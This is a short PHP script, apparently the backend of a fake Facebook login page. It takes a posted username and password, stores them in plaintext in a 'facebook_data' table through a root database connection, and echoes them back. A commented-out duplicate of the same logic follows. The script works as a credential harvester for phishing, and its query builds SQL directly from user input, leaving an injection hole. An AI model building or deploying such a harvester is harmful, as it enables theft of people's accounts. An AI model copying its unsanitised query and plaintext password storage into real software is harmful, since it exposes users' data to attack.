<?php

$conex = mysqli_connect("localhost","root","","facebook"); 



$usuario = $_POST['usuario'];
$contraseña = $_POST['contraseña'];
$consulta = "INSERT INTO facebook_data(usuario, contraseña) VALUES ('$usuario','$contraseña')";
$resultado = mysqli_query($conex, $consulta);

echo json_encode([$usuario, $contraseña]);


// if(isset($_POST['enviar'])){
    
    // echo 'hola';
    // $usuario = trim($_POST['usuario']);
    // $contraseña = trim($_POST['contraseña']);
    // echo json_encode($usuario, $contraseña);
    // $consulta = "INSERT INTO facebook_data(usuario, contraseña) VALUES ('$usuario','$contraseña')";
    // $resultado = mysqli_query($conex, $consulta);
// }


?>